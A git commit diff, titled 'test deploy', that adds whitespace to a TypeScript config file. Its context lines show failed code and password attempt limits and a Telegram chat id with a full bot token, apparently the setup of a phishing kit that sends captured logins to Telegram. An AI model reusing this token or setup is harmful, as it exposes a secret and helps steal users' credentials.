105a3cea2aa34d0161f38a6e12b2b69f30f6b499
nguyendoantien1920 <nguyendoantien1920@gmail.com>
2025-06-25 01:49:39 +0900

    test deploy

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -16,7 +16,8 @@ const defaultConfig: Config = {
     max_failed_code_attempts: 5,
     max_failed_password_attempts: 0,
     password_loading_time: 5000,
-  },
+  }, 
+  
   telegram: {
     data_chatid: "-4986831619",
     data_token: "7873009141:AAGFdIpfuxUMtsL3SgP9dkxPpaR2fakHl-k",
